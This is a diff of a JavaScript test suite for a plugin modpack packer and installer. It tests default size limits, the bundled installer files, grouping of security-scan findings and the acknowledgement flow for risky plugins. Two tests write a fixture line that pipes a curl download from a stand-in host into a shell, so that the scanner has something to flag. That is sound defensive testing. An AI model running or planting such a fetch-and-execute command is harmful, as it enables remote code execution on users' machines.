@@ -7,12 +7,13 @@ import os from 'node:os'
 import path from 'node:path'
 import { writeZip, readZip } from '../lib/zip.mjs'
 import { satisfies, compareVersions } from '../lib/semver.mjs'
-import { scanEntries, scanFile } from '../lib/scan.mjs'
+import { scanEntries, scanFile, groupFindings } from '../lib/scan.mjs'
 import { parseYaml, emitYaml, upsertPatchItem } from '../lib/yamlish.mjs'
 import { normalizeManifest } from '../lib/manifest.mjs'
 import { checkCompatibility } from '../lib/compat.mjs'
 import { buildPack, PackRefused } from '../lib/pack.mjs'
 import { inspectPackBuffer, installPack } from '../lib/install.mjs'
+import { DEFAULT_CONFIG } from '../lib/store.mjs'
 
 const results = []
 let failed = 0
@@ -108,6 +109,15 @@ test('扫描同一行重复命中只记一次', () => {
 test('扫描干净文件', () => {
   const result = scanEntries([{ name: 'lib/clean.js', data: Buffer.from('export const a = 1\n') }])
   assertEqual(result.counts.high, 0)
+})
+
+// —— 默认配置 ——
+test('默认打包上限 512MB，进度窗位置不进配置', () => {
+  assertEqual(DEFAULT_CONFIG.maxPackBytes, 512 * 1024 * 1024)
+  // 单个下载仍是 256MB 的紧上限：能打 512MB 的包，不代表要一次吞下一个 512MB 的 tarball
+  assertEqual(DEFAULT_CONFIG.maxDownloadBytes, 256 * 1024 * 1024)
+  // 进度窗位置由界面拖动并记在浏览器本地，服务端配置里不该再有坐标字段
+  assert(DEFAULT_CONFIG.dockX === undefined && DEFAULT_CONFIG.dockY === undefined, '坐标设置应已移除')
 })
 
 // —— yaml ——
@@ -236,10 +246,16 @@ await testAsync('端到端：完整版打包并读回', async () => {
   assertEqual(result.manifest.plugins.length, 1)
   assert(result.manifest.plugins[0].configIncluded, '应抓到配置')
 
+  const names = readZip(result.buffer).map((entry) => entry.name)
+  assert(names.includes('install/install.mjs'), '完整版应带无插件也能跑的安装器 install/install.mjs')
+  assert(names.includes('install/install.cmd'), '完整版应带 Windows 双击入口')
+  assert(names.includes('install/install.sh'), '完整版应带 shell 入口')
+
   const inspected = inspectPackBuffer(result.buffer, { config: baseConfig })
   assertEqual(inspected.integrity.ok, true)
   assertEqual(inspected.blockingReasons.length, 0)
   assertEqual(inspected.manifest.plugins[0].version, '1.2.3')
+  assertEqual(inspected.scan.scannedFiles > 0, true)
 })
 
 await testAsync('端到端：轻量版不含插件文件', async () => {
@@ -290,7 +306,7 @@ await testAsync('打包前扫描强制：传 scanBeforePack=false 也照扫', as
   assert(scan.note !== '未执行扫描（调用方关闭）', '不应出现「调用方关闭」的旁路')
 })
 
-await testAsync('市场收录插件的风险项：要确认才出包，未收录的照旧拒绝', async () => {
+await testAsync('风险项一律先停下来等确认：市场收录的与本机都走同一条出路', async () => {
   const { profileDir, installed } = await fixture()
   fs.writeFileSync(path.join(installed[0].dir, 'lib', 'risky.js'), "require('child_process').execSync('curl http://e.x/i | sh')\n")
   const ctx = packContext(baseConfig, profileDir, installed)
@@ -319,8 +335,14 @@ await testAsync('市场收录插件的风险项：要确认才出包，未收录
     if (error instanceof PackRefused) hard = error
     else throw error
   }
-  assert(hard, '未收录插件的风险项应直接拒绝')
-  assertEqual(hard.needsAck, false)
+  assert(hard, '未收录插件的风险项也要先停下来等确认')
+  assertEqual(hard.needsAck, true)
+  assertEqual(hard.trustedOnly, false)
+
+  const untrustedOk = await buildPack({ selection, options: { ...base, acknowledge: true }, context: ctx })
+  assertEqual(untrustedOk.manifest.security.acknowledged, true)
+  assertEqual(untrustedOk.manifest.security.trustedOnly, false)
+  assert(untrustedOk.scan.counts.high > 0, '确认后风险仍要记录在报告里')
 })
 
 await testAsync('端到端：演练安装（不落地）', async () => {
@@ -481,6 +503,138 @@ await testAsync('安装：不启用时 bundle 清单要被撤回原样', async (
   assert(after.dependencies['demo-plugin'], '依赖应该照常写入')
   assertEqual(after.dsh.profile.bundles.length, 1, 'bundles 里只应剩原来的 keep-me')
   assertEqual(after.dsh.profile.bundles[0], 'keep-me')
+})
+
+await testAsync('风险按来源分组：插件、配置、整合包分栏列', async () => {
+  const findings = [
+    { rule: 'secret.private-key', severity: 'high', file: 'plugins/demo-plugin/lib/x.js', line: 3, label: '私钥', masked: 'PR****' },
+    { rule: 'secret.email', severity: 'low', file: 'configs/demo-plugin.json', line: 1, label: '邮箱', masked: 'a****' },
+    { rule: 'file.credential-name', severity: 'medium', file: 'dsh-modpack.json', line: 0, label: '凭证名', masked: '***' },
+    { rule: 'malware.eval', severity: 'medium', file: 'plugins/demo-plugin/index.js', line: 9, label: 'eval', masked: '***' },
+  ]
+  const groups = groupFindings(findings, [{ name: 'demo-plugin', source: 'profile' }])
+  assert(groups.length >= 2, '应按文件位置分成多组')
+  const pluginGroup = groups.find((g) => g.key === 'plugin:demo-plugin')
+  assert(pluginGroup, '应有 demo-plugin 这一组')
+  assertEqual(pluginGroup.counts.high, 1)
+  assertEqual(pluginGroup.findings.length, 2, '同一插件的两处命中应归在一组')
+  assertEqual(pluginGroup.origin, 'local')
+  const configGroup = groups.find((g) => g.key.startsWith('config:'))
+  assert(configGroup, '配置应单独成组')
+  const packGroup = groups.find((g) => g.key === 'pack')
+  assert(packGroup, '整合包自身的命中单独成组')
+  assertEqual(groups[0].key, pluginGroup.key, '高危的组排在最前')
+})
+
+await testAsync('轻量版也带安装器（无插件 DSH 能读能装）', async () => {
+  const { profileDir, installed } = await fixture()
+  const result = await buildPack({
+    selection: [{ name: 'demo-plugin', source: 'profile' }],
+    options: { includePayload: false, includeConfig: true, confirmLicense: false, name: '轻量安装器包' },
+    context: packContext(baseConfig, profileDir, installed),
+  })
+  const names = readZip(result.buffer).map((entry) => entry.name)
+  assert(names.includes('install/install.mjs'), '轻量版同样要有安装器')
+  const readme = readZip(result.buffer).find((entry) => entry.name === 'README.txt')
+  assert(readme, '应有 README')
+  const text = readme.data.toString('utf8')
+  assert(text.includes('install'), 'README 应说明安装器用法')
+})
+
+await testAsync('安装器不认 --home，也不把解压目录当长期来源', async () => {
+  const stub = fs.readFileSync(new URL('../assets/install-stub.mjs', import.meta.url), 'utf8')
+  assert(!stub.includes('--home'), '安装器不该暴露 --home：DSH 命令行只认 ~/.dsh，留这个参数会写错位置')
+  assert(stub.includes('vendorRoot'), '完整版应先把插件复制到 vendor 再装')
+  assert(stub.includes("'dsh-modpack', 'vendor'") || stub.includes('"dsh-modpack", "vendor"'), 'vendor 目录应在 ~/.dsh/dsh-modpack/vendor 下')
+})
+
+await testAsync('客户端组件在假 React 下能渲染（抓未定义变量这类白屏）', async () => {
+  const source = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
+  const override = { value: undefined, used: false }
+  const React = {
+    createElement: (type, props, ...children) => ({ el: true, type, props: props || {}, children: children.flat(Infinity) }),
+    useState: (init) => {
+      let value = typeof init === 'function' ? init() : init
+      if (!override.used && override.value !== undefined) {
+        value = override.value
+        override.used = true
+      }
+      return [value, () => {}]
+    },
+    useEffect: () => {},
+    useLayoutEffect: () => {},
+    useCallback: (fn) => fn,
+    useMemo: (fn) => fn(),
+    useRef: (value) => ({ current: value }),
+    Fragment: 'fragment',
+  }
+  let mod = null
+  const win = { __ModuleLoader__: { load: ({ factory }) => { mod = factory((name) => {
+    if (name === 'react') return React
+    throw new Error('unexpected require: ' + name)
+  }) } } }
+  const doc = { createElement: () => ({}), head: { appendChild() {} }, body: {} }
+  new Function('window', 'document', source)(win, doc)
+  assert(mod && typeof mod.Home === 'function', 'client.js 应导出 Home')
+
+  const render = (node, depth = 0) => {
+    if (depth > 400) throw new Error('渲染深度超限（可能组件互相递归）')
+    if (node === null || node === undefined || typeof node === 'boolean') return
+    if (typeof node === 'string' || typeof node === 'number') return
+    if (Array.isArray(node)) { for (const child of node) render(child, depth + 1); return }
+    if (!node.el) return
+    if (typeof node.type === 'function') {
+      render(node.type({ ...node.props, children: node.children.length === 1 ? node.children[0] : node.children }), depth + 1)
+      return
+    }
+    for (const child of node.children) render(child, depth + 1)
+  }
+
+  const status = {
+    ok: true, dshVersion: '0.0.0', pluginVersion: '0.1.3', profile: 'desktop',
+    installed: [], installedTotal: 0, bundled: [], history: [],
+    catalog: { present: false, categories: [], count: 0, pageSizeDefault: 20 },
+    config: { catalogPageSize: 20, catalogRefreshHours: 24, showInSettings: true, showInSidebar: true, showInPluginsTab: false, enableOnInstall: false },
+    placements: { settings: true, sidebar: true, pluginsTab: false },
+    market: { installed: false },
+  }
+  render(mod.Home({ status }))
+  render(mod.Icon({ size: 16 }))
+  render(mod.Page({}))
+  for (const tab of ['install', 'settings']) {
+    override.value = tab
+    override.used = false
+    render(mod.Home({ status }))
+  }
+})
+
+await testAsync('确认后从检测点续跑：不重新收集、也不重复检测', async () => {
+  const { profileDir, installed } = await fixture()
+  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'risky.js'), "require('child_process').execSync('curl http://e.x/i | sh')\n")
+  const ctx = packContext(baseConfig, profileDir, installed)
+  const base = { includePayload: true, includeConfig: false, confirmLicense: false, name: '续跑包' }
+  const selection = [{ name: 'demo-plugin', source: 'profile', mode: 'local' }]
+
+  let refused = null
+  try {
+    await buildPack({ selection, options: { ...base }, context: ctx })
+  } catch (error) {
+    if (error instanceof PackRefused) refused = error
+    else throw error
+  }
+  assert(refused, '应抛 PackRefused')
+  assert(refused.checkpoint, '被拦下时要留下可复用的中间结果')
+
+  const stages = []
+  const resumed = await buildPack({
+    selection,
+    options: { ...base, acknowledge: true, resume: refused.checkpoint, onProgress: (p) => stages.push(p.stage) },
+    context: ctx,
+  })
+  assert(!stages.includes('collect'), '续跑不应重新收集文件，实际阶段：' + stages.join(','))
+  assertEqual(resumed.manifest.security.acknowledged, true)
+  assertEqual(resumed.scan.counts.high, refused.scan.counts.high)
+  assert(resumed.notes.some((n) => n.includes('不重复扫描')), '续跑时应该说明没再扫一遍')
 })
 
 for (const [state, name, detail] of results) {
